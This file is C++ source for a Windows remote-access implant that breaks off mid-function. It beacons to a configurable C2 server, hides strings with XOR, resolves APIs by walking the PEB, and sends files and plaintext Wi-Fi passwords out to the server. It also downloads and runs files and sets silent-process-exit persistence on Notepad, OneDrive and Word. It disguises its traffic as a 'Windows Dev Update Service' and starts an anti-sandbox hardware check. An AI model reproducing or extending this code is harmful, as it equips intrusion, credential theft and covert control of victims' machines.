// Agents.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
// 
//

#include <iostream>
#include <Windows.h>
#include <WinHttp.h>
#include <wlanapi.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <cmath>
#include <winternl.h>
#include <algorithm>
#include <string>
#include <winternl.h>
#include <vector>
#include <sddl.h>

#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "Wlanapi.lib")

#define C2SERVER L"localhost" // C2 domain name or ip address
#define C2SERVSZ 10 // Lengh of C2 domain name/ip wstr
#define C2CIPHERKEY 'X' // wchar key to encrypt the domain with at compile time

#define WCHARSZ sizeof(wchar_t)
#define AGENTLEN 12 // length of agent name

INTERNET_PORT port = 5000; // C2 Server port

/* compile time encryption and runtime decryption */
template <typename d_type, size_t d_ln, d_type xor_key> // structure for compile time encryption of data
struct xor_stream {
    d_type data[d_ln] = { 0 };
    constexpr xor_stream(const d_type* in_data) {
        for (int i = 0; i < d_ln; i++) {
            data[i] = in_data[i] ^ xor_key;
        }
    }
};

std::wstring runtime_decryptW(const wchar_t* inp, wchar_t k, size_t inp_ln) {
    wchar_t* out = new wchar_t[inp_ln + 1];
    for (int i = 0; i < inp_ln; i++) {
        out[i] = inp[i] ^ k;
    }
    out[inp_ln] = '\0';
    return std::wstring(out);
}

std::string runtime_decryptA(const char* inp, char k, size_t inp_ln) {
    char* out = new char[inp_ln + 1];
    for (int i = 0; i < inp_ln; i++) {
        out[i] = inp[i] ^ k;
    }
    out[inp_ln] = '\0';
    return std::string(out);
}
/* ------------------------ */

/* applications to attach silent exit persistence mechanism to */
constexpr auto compile_time_exe1 = xor_stream<wchar_t, 12, 'n'>(L"Notepad.exe");
constexpr auto compile_time_exe2 = xor_stream<wchar_t, 13, 'm'>(L"OneDrive.exe");
constexpr auto compile_time_exe3 = xor_stream<wchar_t, 12, 'v'>(L"winword.exe");

std::wstring runtime_exe1 = runtime_decryptW(compile_time_exe1.data, 'n', 12);
std::wstring runtime_exe2 = runtime_decryptW(compile_time_exe2.data, 'm', 13);
std::wstring runtime_exe3 = runtime_decryptW(compile_time_exe3.data, 'v', 12);

std::vector<std::wstring> silent_exe_apps {runtime_exe1, runtime_exe2, runtime_exe3};
/* ------------------------ */

/*  write to HKLM run key for persistence along with the silent process exit persistence mechanism */
BOOL writeToRun = false;
/* ------------------------ */


/* wdm.h - for compatibility with NT functions without including wdm */
/* ------------------------ */
typedef enum _KEY_VALUE_INFORMATION_CLASS {
    KeyValueBasicInformation,
    KeyValueFullInformation,
    KeyValuePartialInformation,
    KeyValueFullInformationAlign64,
    KeyValuePartialInformationAlign64,
    KeyValueLayerInformation,
    MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

typedef struct _KEY_VALUE_FULL_INFORMATION {
    ULONG TitleIndex;
    ULONG Type;
    ULONG DataOffset;
    ULONG DataLength;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_VALUE_FULL_INFORMATION, * PKEY_VALUE_FULL_INFORMATION;
/* ------------------------ */

typedef unsigned long f_addr;

/* Functions to be dynamically resolved */
typedef HMODULE(WINAPI* GetModuleSig)(LPCWSTR);
typedef FARPROC(WINAPI* GetProcSig)(HMODULE, LPCSTR);
typedef NTSYSAPI BOOLEAN(WINAPI* RtlUnicodeStrSig)(PUNICODE_STRING, PCWSTR);
typedef void (WINAPI* InitObjAttSig)(POBJECT_ATTRIBUTES, PUNICODE_STRING, ULONG, HANDLE, PSECURITY_DESCRIPTOR);

GetModuleSig GetModHandleW;
GetProcSig GetProcAddr;
RtlUnicodeStrSig RtlCreateUnicode;
InitObjAttSig InitObjectAttributes;

/* NT Registry key functions */
typedef NTSTATUS(*NtCreateKSig)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING, ULONG, PULONG);
typedef NTSTATUS(*NtSetValSig)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(*NtOpenKSig)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS(*NtQueryKSig)(HANDLE, PUNICODE_STRING, KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);

NtCreateKSig NtCreateRegKey;
NtSetValSig NtSetKeyVal;
NtOpenKSig NtOpenRegKey;
NtQueryKSig NtQueryRegKey;

/* File execution functions */
typedef BOOL(WINAPI* CreateProcSig)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
CreateProcSig CreateProcA;

/* HARDWARE check functions */
typedef void (WINAPI* GetSysSig)(LPSYSTEM_INFO);
typedef BOOL(WINAPI* GlobStatusSig)(LPMEMORYSTATUSEX);

GetSysSig GetSysInfo;
GlobStatusSig GlobalMemStatus;
/* ------------------------ */




/* C2 routes and other info */
constexpr auto enc_serv = xor_stream<wchar_t, C2SERVSZ, C2CIPHERKEY>(C2SERVER);
std::wstring decoded_ip = runtime_decryptW(enc_serv.data, C2CIPHERKEY, C2SERVSZ);
LPCWSTR ip = decoded_ip.c_str();

constexpr auto wtask_enc = xor_stream<wchar_t, 11, 'a'>(L"/payloads/");
constexpr auto uri_enc = xor_stream<wchar_t, 2, 'f'>(L"/");


std::wstring wtask_uri = runtime_decryptW(wtask_enc.data, 'a', 11);
std::wstring wresults_uri = runtime_decryptW(wtask_enc.data, 'a', 11);
std::wstring wfileURI = runtime_decryptW(uri_enc.data, 'f', 2);


wchar_t* task_uri;
wchar_t* results_uri;
wchar_t* file_uri;

DWORD dataMax = 0;


bool isReg = false;

/* change to false for unencrypted HTTP communications */
bool isDecrypted = true;
bool encryptData = true;

uint8_t testKey[6] = { 0, 0, 0, 0, 0, 0 }; // encryption key to be dynamically resolved at runtime

enum action { // task types
    dir = 0x1,
    view,
    change_time,
    download,
    execute,
    get_n_pass,
    get_exe_dir,
    get_names,
    get_all,
    upload

};



struct payloadLine { // for parsing task
    u_char type;
    u_char getResult;
    u_char isDone;

};
/* ------------------------ */

void print_bytes(PBYTE buff, size_t bSz) {
    for (int i = 0; i < bSz; i++) {
        printf("0x%x\n", buff[i]);
    }
}



/* gets a * to start of loaded dll */
PIMAGE_DOS_HEADER get_module_hdr(PWSTR module_name) { 
    PEB* peb = (PEB*)__readgsqword(0x60);
    PLIST_ENTRY list_hdr = &(peb->Ldr->InMemoryOrderModuleList);
    PLIST_ENTRY list_c = list_hdr->Flink; 
    do {
        size_t tmpSz = 0;
        PLDR_DATA_TABLE_ENTRY mod_entry = CONTAINING_RECORD(list_c, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        USHORT mSz = mod_entry->FullDllName.MaximumLength;
        USHORT sSz = mod_entry->FullDllName.Length; 
        PWSTR pD_name = mod_entry->FullDllName.Buffer;

        PWSTR mod_name = (PWSTR)malloc(mSz + sizeof(wchar_t));
        memcpy(mod_name, pD_name, sSz + sizeof(wchar_t));

        PWSTR int_buff;
        PWSTR tmp = wcstok_s(mod_name, L"\\", &int_buff); // split the dll name using 
        PWSTR dll_name = (PWSTR)malloc(mSz);
        memset(dll_name, 0, mSz);
        while (tmp) {

            tmpSz = wcsnlen_s(tmp, mSz);
            memcpy(dll_name, tmp, (tmpSz + 1) * sizeof(wchar_t));
            tmp = wcstok_s(nullptr, L"\\", &int_buff);
            if (!tmp) break;

        }

        if (!_wcsnicmp(module_name, dll_name, tmpSz)) {
            free(dll_name);
            free(mod_name);
            return (PIMAGE_DOS_HEADER)mod_entry->DllBase;
        }
        free(mod_name);
        free(dll_name);
        list_c = list_c->Flink;

    } while (list_hdr != list_c);

    return nullptr;

}
/* gets a * to a function in the specified dll */
PBYTE get_func_addr(PIMAGE_DOS_HEADER dos_hdr, PCSTR exp_func, size_t mSz) { // split using wstring stuff
    if (dos_hdr == nullptr) {
        return nullptr;
    }
    PBYTE base_addr = (PBYTE)dos_hdr;
    PIMAGE_NT_HEADERS nt_hdr = (PIMAGE_NT_HEADERS)(base_addr + dos_hdr->e_lfanew);
    PIMAGE_OPTIONAL_HEADER opt_hdr = (PIMAGE_OPTIONAL_HEADER)(&nt_hdr->OptionalHeader);
    PIMAGE_EXPORT_DIRECTORY exp_dir = (PIMAGE_EXPORT_DIRECTORY)(base_addr + opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    f_addr* func_addrs = (f_addr*)(base_addr + exp_dir->AddressOfFunctions);
    f_addr* name_addrs = (f_addr*)(base_addr + exp_dir->AddressOfNames);
    PUSHORT ord_addrs = (PUSHORT)(base_addr + exp_dir->AddressOfNameOrdinals);

    for (int i = 0; i < exp_dir->NumberOfNames; i++) {
        PCSTR func_name = (PSTR)(base_addr + name_addrs[i]);
        if (!strncmp(exp_func, func_name, mSz)) {
            PBYTE gcd = (base_addr + func_addrs[ord_addrs[i]]);
            return gcd;
        }
    }
    return nullptr;
}
/*General helper and data conversion functions */
size_t getXmlLength(wchar_t* xml) {
    size_t i = 0;
    while (xml[i]) i++;
    return i + 1;
}

void fix_string(u_char* raw_buff) {
    int i = 0;
    while (raw_buff[i] != '\n') {
        i++;
    }
    raw_buff[i] = '\0';

}


int cstr_to_wstr(char* cstr, wchar_t** wstr, size_t cstrMax) {
    size_t converted = 0;
    errno_t errCode;
    size_t wSize = strnlen(cstr, cstrMax) + 1;
    *wstr = new wchar_t[wSize];
    if (!*wstr) return 1;
    errCode = mbstowcs_s(&converted, *wstr, wSize, cstr, _TRUNCATE);
    return errCode;
}

int wstr_to_cstr(char** cstr, wchar_t* wstr, size_t wstrMax) {
    size_t converted = 0;
    errno_t errCode;
    size_t cSize = wcsnlen(wstr, wstrMax) + 1;
    *cstr = new char[cSize];
    if (!*cstr) return 1;
    errCode = wcstombs_s(&converted, *cstr, cSize, wstr, _TRUNCATE);
    return 0;
}

size_t uchar_strlen(u_char* src, size_t max) {
    int i = 0;
    while (src[i] != '\0' && i <= max) i++;
    return i;
}

u_char* uchar_ncat(u_char* dest, u_char* src, size_t src_sz, size_t max_dsize) {
    size_t dSize = uchar_strlen(dest, max_dsize);
    u_char* n_start = dest + dSize;
    memcpy(n_start, src, src_sz);
    return dest;
}

void print_uchar_str(u_char* u_str, size_t sz) {
    for (int i = 0; i < sz; i++) {
        printf("0x%x ", u_str[i]);
    }
    printf("\n");
}


int uchar_to_char(char* dest, u_char* src, size_t sz) {
    for (size_t i = 0; i < sz; i++) {
        if (src[i] > 0x7f) { // 0x7f is max char positive 
            return 1;
        }
        dest[i] = (char)src[i];
    }
    return 0;
}

int char_to_uchar(u_char* dest, char* src, size_t sz) {
    for (size_t i = 0; i < sz; i++) {
        dest[i] = src[i];
    }
    return 0;
}

/* ------------------------ */


/* HTTP custom encryption functions */
void get_enc_array(unsigned long enc_key, uint8_t* key_arr) {
    for (int i = 5; i >= 0; i--) {
        unsigned int c = enc_key % 10;
        key_arr[i] = c;
        enc_key /= 10;
    }
}


void data_encryption(uint8_t* key_arr, u_char* in_data, u_char* out_data, size_t data_len, int last_index) {
    u_char enc_b;
    int arr_i = 0;
    int k_index = 0;

    for (int b_index = 0; b_index < data_len; b_index++) {
        if (last_index >= 0) {
            k_index = (last_index + b_index) % 6;
        }
        else {
            k_index = b_index % 6;
        }

        enc_b = in_data[b_index] ^ key_arr[k_index];
        out_data[b_index] = enc_b;
    }

}


void dyn_data_encryption(uint8_t* key_arr, u_char* in_data, size_t data_len) {
    u_char enc_b;
    int arr_i = 0;
    int k_index = 0;


    for (int b_index = 0; b_index < data_len; b_index++) {
        k_index = b_index % 6;
        enc_b = in_data[b_index] ^ key_arr[k_index];
        in_data[b_index] = enc_b;
    }

}
/* ------------------------ */


HINTERNET startHTTPInstance(LPCWSTR C2_IP, INTERNET_PORT C2_PORT, LPCWSTR URI, LPCWSTR verb) { // Fix any close handle issues

    constexpr auto windev_enc = xor_stream<wchar_t, 27, 'j'>(L"Windows Dev Update Service");
    std::wstring windev_str = runtime_decryptW(windev_enc.data, 'j', 27);

    HINTERNET hSession = WinHttpOpen(windev_str.c_str(), 
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        return NULL;
    }
    HINTERNET hConnection = WinHttpConnect(hSession, C2_IP, C2_PORT, 0);
    if (!hConnection) {
        WinHttpCloseHandle(hSession);
        return NULL;
    }
    HINTERNET hRequest = WinHttpOpenRequest(hConnection, verb, URI, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnection);
        WinHttpCloseHandle(hSession);
        return NULL;
    }
    return hRequest;
}


void send_results(LPCWSTR C2_IP, INTERNET_PORT C2_PORT, LPCWSTR URI, LPCVOID in_data, DWORD dwSize) {
    bool isSuccess;
    DWORD bytesWritten = 0;
    u_char* data;
    HINTERNET hRequest = startHTTPInstance(C2_IP, C2_PORT, URI, L"POST");
    if (!hRequest) return;

    isSuccess = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, dwSize, 0);
    if (!isSuccess) {
        WinHttpCloseHandle(hRequest);
        return;
    }

    if (encryptData) {
        data = (u_char*)malloc(dwSize);
        data_encryption(testKey, (u_char*)in_data, data, dwSize, -1);
    }
    else {
        data = (u_char*)in_data;
    }

    isSuccess = WinHttpWriteData(hRequest, data, dwSize, &bytesWritten);
    if (!isSuccess) {
        if (encryptData) free(data);
        WinHttpCloseHandle(hRequest);
        return;
    }

    isSuccess = WinHttpReceiveResponse(hRequest, NULL);
    if (!isSuccess) {
        if (encryptData) free(data);
        WinHttpCloseHandle(hRequest);
        return;
    }
    if (encryptData) free(data);
    WinHttpCloseHandle(hRequest);
}

void send_download(LPCSTR filename) {

    bool isSuccess;
    DWORD bytesWritten = 0;

    HANDLE hFile = CreateFileA(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (GetLastError() == ERROR_FILE_NOT_FOUND) {
        send_results(ip, port, results_uri, "Not found", 10);
        CloseHandle(hFile);
        return;
    }

    if (hFile == INVALID_HANDLE_VALUE) {
        send_results(ip, port, results_uri, "Failed to open", 15);
        CloseHandle(hFile);
        return;
    }

    DWORD fSz = GetFileSize(hFile, NULL);
    if (fSz == INVALID_FILE_SIZE) {
        send_results(ip, port, results_uri, "Failed to get size", 19);
        CloseHandle(hFile);
        return;
    }
    u_char* fBuff = (u_char*)malloc(fSz + 1);
    isSuccess = ReadFile(hFile, fBuff, fSz, NULL, NULL);
    if (!isSuccess) {
        free(fBuff);
        CloseHandle(hFile);
        send_results(ip, port, results_uri, "Failed to read", 15);
        return;
    }

    send_results(ip, port, results_uri, fBuff, fSz);
    free(fBuff);
    CloseHandle(hFile);
}

std::wstring register_agent(LPCWSTR C2_IP, INTERNET_PORT C2_PORT, LPCWSTR URI, LPSTR host_info, DWORD hSz) {
    std::wstring agentName = L"";
    bool isSuccess;

    DWORD bytesAvailable = 0;
    DWORD bytesRead = 0;

    LPSTR data_buff;
    LPWSTR w_data_buff;

    HINTERNET hRequest = startHTTPInstance(C2_IP, C2_PORT, URI, L"POST");
    if (!hRequest) {
        return agentName;
    }

   
    constexpr xor_stream<wchar_t, 47, 'a'> enc_type = xor_stream<wchar_t, 47, 'a'>(L"content-type:application/x-www-form-urlencoded");
    std::wstring content_type = runtime_decryptW(enc_type.data, 'a', 47);

    isSuccess = WinHttpSendRequest(hRequest, content_type.c_str(), -1,(LPVOID)host_info, hSz, hSz, NULL);

    if (!isSuccess) {
        return agentName;
    }


    isSuccess = WinHttpReceiveResponse(hRequest, NULL);
    if (!isSuccess) return agentName;

    if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable) || bytesAvailable <= 0) return agentName;
    if (bytesAvailable > 15) return agentName;

    data_buff = new char[bytesAvailable + 1];
    w_data_buff = new wchar_t[bytesAvailable + 1];

    ZeroMemory(data_buff, bytesAvailable + 1);
    if (!WinHttpReadData(hRequest, (LPVOID)data_buff,
        bytesAvailable, &bytesRead)) return agentName;
    cstr_to_wstr(data_buff, &w_data_buff, bytesAvailable + 1);
    agentName = std::wstring(w_data_buff);
    return agentName;
}

u_char* beacon_c2(LPCWSTR C2_IP, INTERNET_PORT C2_PORT, LPCWSTR URI, LPCWSTR verb) {
    bool isSuccess;

    u_char* recv_data = (u_char*)malloc(1);
    if (!recv_data) {
        return NULL;
    }
    memset(recv_data, 0, 1);

    u_char* data_buff;
    u_char* tmp;
    DWORD totalSize = 0;

    HINTERNET hRequest = startHTTPInstance(C2_IP, C2_PORT, URI, verb);

    isSuccess = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);



    if (!isSuccess) {
        free(recv_data);
        return NULL;

    }
    isSuccess = WinHttpReceiveResponse(hRequest, NULL);
    DWORD bytesAvailable = 0;
    DWORD bytesRead = 0;
    if (isSuccess) {
        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
            data_buff = new u_char[bytesAvailable + 1];
            if (!data_buff) {
                send_results(ip, port, results_uri, "Null buffer", 12);
                return NULL;
            }
            else {
                ZeroMemory(data_buff, bytesAvailable + 1);
                if (WinHttpReadData(hRequest, (LPVOID)data_buff, bytesAvailable, &bytesRead)) {
                    totalSize += bytesAvailable;
                    tmp = (u_char*)realloc(recv_data, totalSize);
                    if (!tmp) {
                        send_results(ip, port, results_uri, "tmp NULL", 9);
                        return NULL;
                    }
                    else {
                        recv_data = tmp;
                    }
                    uchar_ncat(recv_data, data_buff, bytesAvailable, totalSize);

                }
            }
        }

    }
    dataMax = totalSize;
    return recv_data;

}


int cat_file(char* fileName) {
    HANDLE hFile = CreateFileA(fileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return GetLastError();
    DWORD fileSz = GetFileSize(hFile, NULL);
    if (fileSz == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return GetLastError();
    }

    char* fileBuff = (char*)malloc((fileSz + 1) * sizeof(char));
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, fileBuff, fileSz, &bytesRead, NULL)) {
        free(fileBuff);
        CloseHandle(hFile);
        return GetLastError();
    }
    if (bytesRead < fileSz) send_results(ip, port, results_uri, "Failed to read all", 19);
    send_results(ip, port, results_uri, fileBuff, fileSz);
    free(fileBuff);
    CloseHandle(hFile);
    return 0;
}



void perform_dir(std::string dirName, std::string* dirBuff) { /* fix bad error checking on this */

    HANDLE hFind = INVALID_HANDLE_VALUE;
    LPWIN32_FIND_DATAA lpFileData = (LPWIN32_FIND_DATAA)malloc(sizeof(WIN32_FIND_DATAA));
    LPSYSTEMTIME sysTime = (LPSYSTEMTIME)malloc(sizeof SYSTEMTIME);


    if (lpFileData == 0) {
        send_results(ip, port, results_uri, "failed to allocate data", 24);
        return;
    }


    if (dirName.length() > MAX_PATH - 3) {
        send_results(ip, port, results_uri, "Path name too long", 19);
        return;
    }
    dirName += "\\*";

    hFind = FindFirstFileA(dirName.c_str(), lpFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        send_results(ip, port, results_uri, "failed to locate file", 22);
        return;
    }
    do {

        char* name = lpFileData->cFileName;
        FILETIME creationTime = lpFileData->ftCreationTime;

        if (sysTime != 0 && FileTimeToSystemTime(&creationTime, sysTime)) {
            *dirBuff += (std::to_string(sysTime->wMonth) + "/" + std::to_string(sysTime->wDay) + "/" + std::to_string(sysTime->wYear));
        }

        if (lpFileData->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            *dirBuff += (" <D> " + std::string(name) + "\n");
        }
        else {
            *dirBuff += (" " + std::string(name) + "\n");
        }

    } while (FindNextFileA(hFind, lpFileData));
    if (GetLastError() != ERROR_NO_MORE_FILES) {
        send_results(ip, port, results_uri, "function failed", 16);
    }

    free(sysTime);
    free(lpFileData);
}

void getExeDir(char* FilePath) {
    if (!GetModuleFileNameA(NULL, FilePath, MAX_PATH)) {
        send_results(ip, port, results_uri, "failed to get module name", 26);
    }
}


void recv_upload(char* filePath) {

    HANDLE hFile = CreateFileA(filePath, GENERIC_ALL, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (GetLastError() == ERROR_ALREADY_EXISTS) {

        send_results(ip, port, results_uri, (char*)"File already exists", 20);
    }
    else if (hFile == INVALID_HANDLE_VALUE) {

        return;
    }


    bool isSuccess;
    u_char* data_buff;

    HINTERNET hRequest = startHTTPInstance(ip, port, file_uri, L"GET");

    isSuccess = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!isSuccess) {

        return;
    }
    isSuccess = WinHttpReceiveResponse(hRequest, NULL);

    DWORD bytesAvailable = 0;
    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;
    DWORD totalIndex = 0;

    if (isSuccess) {

        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {

            data_buff = new u_char[bytesAvailable + 1];
            if (!data_buff) {
                return;
            }
            else {
                ZeroMemory(data_buff, bytesAvailable + 1);
                if (WinHttpReadData(hRequest, (LPVOID)data_buff, bytesAvailable, &bytesRead)) {
                    // data_encryption(DWORD key, u_char* data, size_t data_len)
                    if (encryptData) {
                        u_char* encryptedData = (u_char*)malloc(bytesAvailable + 1);
                        data_encryption(testKey, data_buff, encryptedData, bytesAvailable, totalIndex);
                        totalIndex += bytesAvailable;
                        isSuccess = WriteFile(hFile, encryptedData, bytesAvailable, &bytesWritten, NULL);
                        if (!isSuccess) {

                            send_results(ip, port, results_uri, "Failed to write buffer", 23);
                        }
                        free(encryptedData);
                    }
                    else {

                        isSuccess = WriteFile(hFile, data_buff, bytesAvailable, &bytesWritten, NULL);
                        if (!isSuccess) {
                            send_results(ip, port, results_uri, "Failed to write buffer", 23);
                        }

                    }


                }
            }
        }

    }
    CloseHandle(hFile);
    send_results(ip, port, results_uri, "SUCCESS", 8);
}

int execute_f(char* filePath) { /* dynamically get CreateProcessA */
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    memset(&si, 0, sizeof(si));
    bool pSuccess = CreateProcA(filePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, &si, &pi);
    if (!pSuccess) {
        return 1;
    }
    else {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }
}


void get_network_info(bool getAll, bool getNames, bool getOne, wchar_t* wifiName) {

    DWORD version = 0;
    HANDLE clientHandle;

    if (WlanOpenHandle(2, NULL, &version, &clientHandle) != ERROR_SUCCESS) {
        send_results(ip, port, results_uri, "failed to open handle", 22);
    }
    else {
        PWLAN_INTERFACE_INFO_LIST interfaceList;
        DWORD getKey = WLAN_PROFILE_GET_PLAINTEXT_KEY;
        DWORD readAccess = WLAN_READ_ACCESS;
        DWORD enumSuccess;
        enumSuccess = WlanEnumInterfaces(clientHandle, NULL, &interfaceList);
        if (enumSuccess == ERROR_SUCCESS) {
            for (DWORD i = 0; i < interfaceList->dwNumberOfItems; i++) {
                WLAN_INTERFACE_INFO currentInterface = interfaceList->InterfaceInfo[i];
                PWLAN_PROFILE_INFO_LIST profileList;
                if (WlanGetProfileList(clientHandle, &currentInterface.InterfaceGuid, NULL, &profileList) == ERROR_SUCCESS) {

                    if (!getOne) {
                        for (DWORD i = 0; i < profileList->dwNumberOfItems; i++) {

                            wchar_t* profileName = profileList->ProfileInfo[i].strProfileName;

                            if (getAll) {
                                LPWSTR plaintextKey;
                                DWORD failed = 0;
                                if (failed = WlanGetProfile(clientHandle, &currentInterface.InterfaceGuid, profileName,
                                    NULL, &plaintextKey, &getKey, &readAccess) == ERROR_SUCCESS) {

                                    char* s_buffer;
                                    size_t maxSize = getXmlLength(plaintextKey);
                                    wstr_to_cstr(&s_buffer, plaintextKey, maxSize);

                                    send_results(ip, port, results_uri, s_buffer, maxSize);
                                }
                                else {
                                    send_results(ip, port, results_uri, "failed to get profile", 22);
                                }
                            }

                            else if (getNames) {
                                char* s_buffer;
                                size_t maxSize = getXmlLength(profileName);
                                wstr_to_cstr(&s_buffer, profileName, maxSize);
                                send_results(ip, port, results_uri, s_buffer, maxSize);
                            }

                        }
                    }
                    else if (getOne && wifiName) {
                        LPWSTR plaintextKey;
                        if (WlanGetProfile(clientHandle, &currentInterface.InterfaceGuid, wifiName, NULL,
                            &plaintextKey, &getKey, &readAccess) == ERROR_SUCCESS) {

                            char* s_buffer;
                            size_t maxSize = getXmlLength(plaintextKey);
                            wstr_to_cstr(&s_buffer, plaintextKey, maxSize);
                            send_results(ip, port, results_uri, s_buffer, maxSize);
                        }
                        else {
                            send_results(ip, port, results_uri, "Failed to get profile", 22);
                        }
                    }
                }
                else
                {
                    send_results(ip, port, results_uri, "Failed to get profile list", 27);
                }

            }
        }
        else {
            send_results(ip, port, results_uri, "failed to enumerate interfaces", 31);

        }
    }

}

void s_key_store(PVOID k_data, PCWSTR key_name, ULONG data_sz, PWSTR entry_name, int REG_TYPE) { /* proper error handling needs to be added */
    HANDLE k_handle;
    bool isSuccess;
    NTSTATUS stat;
    UNICODE_STRING key_obj = { 0 };
    UNICODE_STRING val_name = { 0 };
    OBJECT_ATTRIBUTES att_obj = { 0 };

    isSuccess = RtlCreateUnicode(&key_obj, key_name);
    if (!isSuccess) {
        return;
    }

    isSuccess = RtlCreateUnicode(&val_name, entry_name);
    if (!isSuccess) {
        return;
    }

    InitializeObjectAttributes(&att_obj, &key_obj, OBJ_CASE_INSENSITIVE, NULL, NULL);
    stat = NtCreateRegKey(&k_handle, KEY_ALL_ACCESS, &att_obj, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(stat)) {
        return;
    }
    stat = NtSetKeyVal(k_handle, &val_name, 0, REG_TYPE, k_data, data_sz);
    if (!NT_SUCCESS(stat)) {
        return;
    }
    
    CloseHandle(k_handle);
}

void s_get_agent_name(PWSTR agent_path, int *key_exists, wchar_t *agent_name_out) { /* Again, proper error handling needed*/
    HANDLE k_handle;

    bool isSuccess;
    ULONG regSz = 0;

    UNICODE_STRING data_obj = { 0 };
    UNICODE_STRING val_name = { 0 };
    OBJECT_ATTRIBUTES att_obj = { 0 };

    NTSTATUS nt_stat;
    PKEY_VALUE_FULL_INFORMATION value_info;

    isSuccess = RtlCreateUnicode(&data_obj, agent_path);
    if (!isSuccess) {
        send_results(ip, port, results_uri, "Unicode conversion failed", 26);
        return;
    }
    constexpr auto proc_enc = xor_stream<wchar_t, 12, 'g'>(L"ProcessSeed");
    isSuccess = RtlCreateUnicode(&val_name, runtime_decryptW(proc_enc.data, 'g', 12).c_str());
    if (!isSuccess) {
        send_results(ip, port, results_uri, "Unicode conversion failed", 26);
        return;
    }
    InitializeObjectAttributes(&att_obj, &data_obj, OBJ_CASE_INSENSITIVE, NULL, NULL);


    nt_stat = NtOpenRegKey(&k_handle, KEY_ALL_ACCESS, &att_obj);
    if (!NT_SUCCESS(nt_stat)) {
        if (nt_stat == 0xc0000034) {
            *key_exists = 0;
            return;
        }
        return;
    }


    nt_stat = NtQueryRegKey(k_handle, &val_name, KeyValueFullInformation,nullptr, NULL, &regSz);
    if (nt_stat != 0xc0000023 && !NT_SUCCESS(nt_stat)) {
        return;
    }


    value_info = (PKEY_VALUE_FULL_INFORMATION)malloc(regSz);
    if (!value_info) return;

    nt_stat = NtQueryRegKey(k_handle, &val_name ,KeyValueFullInformation, value_info, regSz, &regSz);
    if (!NT_SUCCESS(nt_stat)) {
        free(value_info);
        return;
    }

    memcpy(agent_name_out, ((PBYTE)value_info + value_info->DataOffset), AGENTLEN * WCHARSZ);
    free(value_info);

    return;
}

int get_auth_info(wchar_t *out_sid, PBOOL isAdmin) { // free heap variables
    HANDLE t_handle;

    DWORD ret_sz = 0;
    DWORD st_sz = sizeof(TOKEN_ELEVATION);

    BOOL is_success;
    BOOL prog_elevated = false;

    BYTE token_buff[104];

    LPWSTR sid_to_copy = nullptr;

    TOKEN_ELEVATION el_token;
    PTOKEN_USER user_token;
   
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t_handle)) {
        return 1;
    }

    is_success = GetTokenInformation(t_handle, TokenElevation, &el_token, sizeof(TOKEN_ELEVATION), &st_sz);
    if (!is_success) {
        return 1;
    }
    prog_elevated = el_token.TokenIsElevated;
    *isAdmin = prog_elevated;

    is_success = GetTokenInformation(t_handle, TokenUser,NULL, 0, &ret_sz);
    if (!is_success && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        return 1;
    }

    is_success = GetTokenInformation(t_handle, TokenUser, token_buff, ret_sz, &ret_sz);
    if (!is_success or ret_sz > 104) {
        return 1;
    }
    
    user_token = (PTOKEN_USER)token_buff;
    
    is_success = ConvertSidToStringSidW(user_token->User.Sid, &sid_to_copy);
    if (!is_success) {
        return 1;
    }
    size_t sid_sz = wcsnlen_s(sid_to_copy, MAX_SID_SIZE)+1;
    memcpy_s(out_sid, MAX_SID_SIZE * WCHARSZ, sid_to_copy, sid_sz * WCHARSZ);
    LocalFree(sid_to_copy);
    return 0;
 
}

bool hardware_check() {
    SYSTEM_INFO hard_info = {0};
    GetSysInfo(&hard_info);
    DWORD processors = hard_info.dwNumberOfProcessors;
    if (processors < 2) return false;

